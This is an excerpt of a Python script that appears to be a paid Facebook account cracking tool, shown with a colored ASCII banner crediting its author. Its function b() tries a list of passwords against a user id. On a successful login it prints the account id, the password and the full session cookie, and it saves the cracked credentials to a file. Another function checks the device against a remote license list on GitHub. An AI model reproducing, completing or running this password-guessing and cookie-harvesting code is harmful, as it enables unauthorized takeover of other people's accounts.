...
\033[34;1m  /$$$$$$     /$$$$$ /$$      /$$ /$$$$$$ /$$$$$$$ 
\033[34;1m /$$__  $$   |__  $$| $$$    /$$$|_  $$_/| $$__  $$
\033[34;1m| $$  \ $$      | $$| $$$$  /$$$$  | $$  | $$  \ $$
\033[34;1m| $$$$$$$$      | $$| $$ $$/$$ $$  | $$  | $$$$$$$/
\033[34;1m| $$__  $$ /$$  | $$| $$  $$$| $$  | $$  | $$__  $$
\033[34;1m| $$  | $$| $$  | $$| $$\  $ | $$  | $$  | $$  \ $$
\033[34;1m| $$  | $$|  $$$$$$/| $$ \/  | $$ /$$$$$$| $$  | $$
\033[34;1m|__/  |__/ \______/ |__/     |__/|______/|__/  |__/ ""
                                                   
                                                   c

\033[38;5;46m┌━━━━━━━━━━━━━━━━━━\033[33;1m⊱   ⊰\033[38;5;46m━━━━━━━━━━━━━━━━━━┐\033[33;1m ┫│\033[38;5;46m𝑬\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mAJMIR \033[38;5;46m│ \033[33;1m┫│\033[38;5;46m𝑹\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m Ajmirhossain000     \033[38;5;46m   │  \033[33;1m┗━┛
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/Ajmirhossain');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mAJMIR-008-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [AJMIR-008-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/AJMIR-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Ajmirhosen000/My-World/blob/main/Ajmi4.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am B.D.H.A ROBOT and my boss is Ajmir.Hossain.Sir this tool is paid because 100% ok id just now login\"")
